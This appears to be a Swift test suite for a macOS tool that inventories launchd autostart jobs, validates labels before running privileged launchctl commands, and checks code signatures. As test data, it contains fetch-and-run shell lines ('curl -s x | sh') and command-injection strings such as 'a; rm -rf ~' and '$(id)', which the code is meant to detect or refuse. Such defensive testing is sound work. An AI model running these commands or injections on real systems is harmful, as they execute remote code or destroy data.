import Foundation
import Security
import Testing

@testable import CareCore

@Suite struct AutostartParsingTests {
    @Test func readsDisabledServices() {
        let text = """

            \tdisabled services = {
            \t\t"com.docker.helper" => enabled
            \t\t"com.apple.ManagedClientAgent.enrollagent" => disabled
            \t\t"old.style" => true
            \t}
            """
        #expect(DisabledServices.parse(text) == ["com.apple.ManagedClientAgent.enrollagent", "old.style"])
    }

    @Test func readsALaunchdJob() throws {
        let plist: [String: Any] = [
            "Label": "com.example.agent",
            "ProgramArguments": ["/Applications/Example.app/Contents/MacOS/helper", "-x"],
            "RunAtLoad": true, "StartInterval": 3600,
        ]
        let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
        let job = try #require(LaunchdJob.parse(data))
        #expect(job.label == "com.example.agent")
        #expect(job.program == "/Applications/Example.app/Contents/MacOS/helper")
        #expect(job.runsAtLoad)
        #expect(job.interval == 3600)
        #expect(LaunchdJob.parse(Data("not a plist".utf8)) == nil)
    }

    @Test func looksThroughLaunchers() {
        let app = "/Applications/Example.app/Contents/MacOS/example"
        let opened = AutostartInventory.resolve(
            program: "/usr/bin/open", arguments: ["/usr/bin/open", "-a", app, "--args"])
        #expect(opened.target == app)
        #expect(opened.launcher == "open")

        let inline = AutostartInventory.resolve(program: "/bin/sh", arguments: ["/bin/sh", "-c", "curl x | sh"])
        #expect(inline.target == nil)
        #expect(inline.launcher == "sh")

        let direct = AutostartInventory.resolve(program: app, arguments: [app, "--flag"])
        #expect(direct.target == app)
        #expect(direct.launcher == nil)

        // Any shell or wrapper that runs a line of script is seen through, not judged as a program by Apple.
        for shell in ["/bin/ksh", "/bin/dash", "/bin/csh", "/bin/tcsh", "/bin/zsh", "/usr/bin/env"] {
            let line = AutostartInventory.resolve(program: shell, arguments: [shell, "-c", "curl -s x | sh"])
            #expect(line.target == nil, "\(shell)")
            #expect(line.launcher == URL(fileURLWithPath: shell).lastPathComponent)
        }
        // A launcher that starts another launcher is followed to the end.
        let nested = AutostartInventory.resolve(
            program: "/usr/bin/arch", arguments: ["/usr/bin/arch", "-arm64", "/bin/ksh", "-c", "curl -s x | sh"])
        #expect(nested.target == nil)
        #expect(nested.launcher == "ksh")
        let viaEnv = AutostartInventory.resolve(
            program: "/usr/bin/env", arguments: ["/usr/bin/env", "-i", "sh", "-c", "curl -s x | sh"])
        #expect(viaEnv.target == nil)
        #expect(viaEnv.launcher == "sh")
        // A line of code that starts with a path is still a line of code; only a bare path is a program.
        let disguised = AutostartInventory.resolve(
            program: "/bin/sh", arguments: ["/bin/sh", "-c", "/opt/tool/agent --run; curl -s x | sh"])
        #expect(disguised.target == nil)
        #expect(disguised.launcher == "sh")
        let withArguments = AutostartInventory.resolve(
            program: "/bin/sh", arguments: ["/bin/sh", "-c", "/opt/tool/agent --run"])
        #expect(withArguments.target == nil)
        let bare = AutostartInventory.resolve(program: "/bin/zsh", arguments: ["/bin/zsh", "-c", "/opt/tool/agent"])
        #expect(bare.target == "/opt/tool/agent")
        let shellInShell = AutostartInventory.resolve(program: "/bin/sh", arguments: ["/bin/sh", "-c", "/bin/zsh"])
        #expect(shellInShell.target == nil)
        let perl = AutostartInventory.resolve(
            program: "/usr/bin/perl", arguments: ["/usr/bin/perl", "-e", "system('/opt/tool/agent')"])
        #expect(perl.target == nil)
        #expect(perl.launcher == "perl")
        let tool = AutostartInventory.resolve(
            program: "/usr/bin/arch", arguments: ["/usr/bin/arch", "-arm64", "/opt/tool/agent", "--run"])
        #expect(tool.target == "/opt/tool/agent")
        #expect(tool.launcher == "arch")

        #expect(AutostartInventory.displayName(target: app, fallback: "label") == "Example")
        #expect(AutostartInventory.displayName(target: "/opt/tool", fallback: "label") == "label")
        #expect(AutostartInventory.enclosingApp("/A/B.app/Contents/Library/x.plist") == "/A/B.app")
    }
}

@Suite struct AutostartInventoryTests {
    let home: TempHome
    let runner: FakeRunner

    init() throws {
        let temp = try TempHome()
        home = temp
        runner = FakeRunner(answers: [
            "/bin/launchctl print-disabled gui/501": CommandResult(
                status: 0, stdout: "\"com.example.off\" => disabled\n\"com.example.agent\" => enabled\n"),
            "/bin/launchctl print-disabled system": CommandResult(
                status: 0, stdout: "\"com.vendor.daemon\" => disabled\n"),
        ])

        func job(_ relative: String, label: String, arguments: [String]) throws {
            let plist: [String: Any] = ["Label": label, "ProgramArguments": arguments, "RunAtLoad": true]
            let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
            let url = temp.path(relative)
            try FileManager.default.createDirectory(
                at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try data.write(to: url)
        }
        let agent = try temp.file("opt/example/agent").path
        let updater = try temp.file("opt/vendor/updater").path
        let daemon = try temp.file("opt/vendor/daemon").path
        let locked = try temp.file("opt/vendor/locked").path
        try FileManager.default.setAttributes([.posixPermissions: 0o111], ofItemAtPath: locked)
        try job("Library/LaunchAgents/com.example.agent.plist", label: "com.example.agent", arguments: [agent])
        try job(
            "Library/LaunchAgents/com.example.off.plist", label: "com.example.off",
            arguments: ["/bin/sh", "-c", "echo hello"])
        try job(
            "Library/LaunchAgents/com.example.gone.plist", label: "com.example.gone",
            arguments: [temp.path("opt/removed/tool").path])
        try job("System/LaunchAgents/com.vendor.updater.plist", label: "com.vendor.updater", arguments: [updater])
        try job("System/LaunchDaemons/com.vendor.daemon.plist", label: "com.vendor.daemon", arguments: [daemon])
        try job("System/LaunchDaemons/com.vendor.locked.plist", label: "com.vendor.locked", arguments: [locked])
        try temp.file("Library/LaunchAgents/notes.txt")
    }

    func inventory() -> AutostartInventory {
        AutostartInventory(
            home: home.url, systemLibrary: home.path("System"), userID: 501, runner: runner,
            inspect: { url in
                url.path.contains("vendor")
                    ? SignatureInfo(kind: .developer(team: "TEAM123456", name: "Vendor Ltd"))
                    : SignatureInfo(kind: .unsigned)
            })
    }

    @Test func listsJobsFromAllThreeFolders() async {
        let items = await inventory().items()
        #expect(
            items.map(\.id) == [
                "userAgent:com.example.agent", "userAgent:com.example.gone", "userAgent:com.example.off",
                "globalAgent:com.vendor.updater", "daemon:com.vendor.daemon", "daemon:com.vendor.locked",
            ])
        #expect(items.map(\.isEnabled) == [true, true, false, true, false, true])

        #expect(items[0].signature?.isTrusted == false)
        // The job points at a program that is no longer there.
        #expect(items[1].isTargetMissing)
        #expect(items[1].signature == nil)
        // A job that only runs a shell line has nothing on disk to judge.
        #expect(items[2].launcher == "sh")
        #expect(items[2].target == nil)
        #expect(items[2].signature == nil)
        #expect(items[3].developer == "Vendor Ltd")
        #expect(items[4].needsAdministrator)
        // A helper that can be run but not read stays unjudged rather than "unsigned".
        #expect(items[5].signature == nil)
        #expect(items[5].isTargetMissing == false)

    }

    @Test func switchingAUserJobMarksItAndStopsIt() async throws {
        let items = await inventory().items()
        var answers = runner.answers
        answers["/bin/launchctl disable gui/501/com.example.agent"] = CommandResult(status: 0, stdout: "")
        answers["/bin/launchctl bootout gui/501/com.example.agent"] = CommandResult(status: 0, stdout: "")
        let control = AutostartControl(userID: 501, runner: FakeRunner(answers: answers))
        try await control.setEnabled(false, items[0])

        // No answer is prepared for "enable", so the fake refuses: the error must surface.
        await #expect(throws: (any Error).self) { try await control.setEnabled(true, items[0]) }
        // An app that opens at login is switched in System Settings, never here.
        let loginItem = AutostartItem(
            id: "loginItem:com.example.messenger", kind: .loginItem, label: "com.example.messenger", name: "Messenger",
            plist: nil, program: "/Applications/Messenger.app", target: "/Applications/Messenger.app", launcher: nil,
            isTargetMissing: false, isEnabled: true, runsAtLoad: true, interval: nil, developer: nil, signature: nil)
        await #expect(throws: AutostartControl.Failure.notSwitchableHere) {
            try await control.setEnabled(false, loginItem)
        }
    }
}

@Suite struct AdminActionTests {
    @Test func buildsOnlyFixedLines() {
        let off =
            "/bin/launchctl disable system/com.vendor.daemon; /bin/launchctl bootout system/com.vendor.daemon; true"
        #expect(AdminAction.disableDaemon(label: "com.vendor.daemon").shellLine == off)
        #expect(
            AdminAction.enableDaemon(
                label: "com.vendor.daemon", plist: "/Library/LaunchDaemons/com.vendor.daemon.plist"
            )
            .shellLine?.contains("bootstrap system /Library/LaunchDaemons/com.vendor.daemon.plist") == true)
    }

    @Test(arguments: [
        "a; rm -rf ~", "x\"y", "a b", "", "$(id)", "a`id`", "a'b", "a\\b", "a/b", "naïve",
    ])
    func refusesAnythingThatIsNotAPlainLabel(label: String) {
        #expect(AdminAction.isSafeLabel(label) == false)
        #expect(AdminAction.disableDaemon(label: label).shellLine == nil)
        #expect(AdminAction.enableDaemon(label: "ok", plist: "/Library/LaunchDaemons/\(label).plist").shellLine == nil)
    }

    @Test func refusesPlistsOutsideTheDaemonFolder() {
        #expect(AdminAction.enableDaemon(label: "ok", plist: "/tmp/ok.plist").shellLine == nil)
        #expect(
            AdminAction.enableDaemon(label: "ok", plist: "/Library/LaunchDaemons/../../tmp/ok.plist").shellLine == nil)
    }

    struct FakeAdmin: AdminScripting {
        let answer: (code: Int, message: String)?
        func run(_ source: String) async -> (code: Int, message: String)? { answer }
    }

    @Test func asksForThePasswordWithTheFixedLine() {
        let line = AdminAction.disableDaemon(label: "x").shellLine!
        #expect(
            AdminAction.disableDaemon(label: "x").script == "do shell script \"\(line)\" with administrator privileges")
        #expect(AdminAction.disableDaemon(label: "x y").script == nil)
    }

    @Test func reportsCancelSeparately() async throws {
        await #expect(throws: AdminAction.Failure.cancelled) {
            try await AdminAction.disableDaemon(label: "x").run(with: FakeAdmin(answer: (-128, "User canceled.")))
        }
        await #expect(throws: AdminAction.Failure.failed("No such service")) {
            try await AdminAction.disableDaemon(label: "x").run(with: FakeAdmin(answer: (1, "No such service")))
        }
        try await AdminAction.disableDaemon(label: "x").run(with: FakeAdmin(answer: nil))
    }
}

@Suite struct CodeSignatureTests {
    @Test func recognisesAppleAndUnsignedPrograms() throws {
        #expect(CodeSignature.inspect(URL(fileURLWithPath: "/bin/ls")).kind == .apple)
        let home = try TempHome()
        let script = try home.file("tool.sh")
        #expect(CodeSignature.inspect(script).kind == .unsigned)
        #expect(CodeSignature.inspect(home.path("missing")).kind == .unsigned)
    }

    @Test func theFullCheckFindsAPatchedProgramThatTheQuickOneMisses() throws {
        let home = try TempHome()
        let copy = home.path("ls")
        try FileManager.default.copyItem(at: URL(fileURLWithPath: "/bin/ls"), to: copy)
        #expect(CodeSignature.inspect(copy, thorough: true).kind == .apple)

        // One byte of code changed, a page into the first architecture.
        var data = try Data(contentsOf: copy)
        var offset = 0x1000
        if data.prefix(4) == Data([0xCA, 0xFE, 0xBA, 0xBE]) {
            offset += data[16..<20].reduce(0) { $0 << 8 | Int($1) }
        }
        data[offset] ^= 0xFF
        try data.write(to: copy)

        #expect(CodeSignature.inspect(copy).kind == .apple)
        #expect(CodeSignature.inspect(copy, thorough: true).kind == .broken)
    }

    @Test func notarizationIsAskedOnlyByTheFullCheck() {
        let ls = URL(fileURLWithPath: "/bin/ls")
        // Apple's own programs are not notarized; the question is only asked about developer-signed code.
        #expect(CodeSignature.inspect(ls, thorough: true).notarized == nil)
        #expect(CodeSignature.inspect(ls).notarized == nil)
        #expect(AutostartInventory.inspectProgram(ls).kind == .apple)
        // The requirement is valid in the code requirement language.
        var requirement: SecRequirement?
        #expect(
            SecRequirementCreateWithString(CodeSignature.notarizedOrAppStore as CFString, [], &requirement)
                == errSecSuccess)
    }

    @Test func shortensCertificateNames() {
        #expect(CodeSignature.developerName("Developer ID Application: Docker Inc (9BNSXJN65R)") == "Docker Inc")
        #expect(CodeSignature.developerName("Apple Development: Jane Doe (ABCDE12345)") == "Jane Doe")
        #expect(CodeSignature.developerName("Plain Name") == "Plain Name")
    }
}
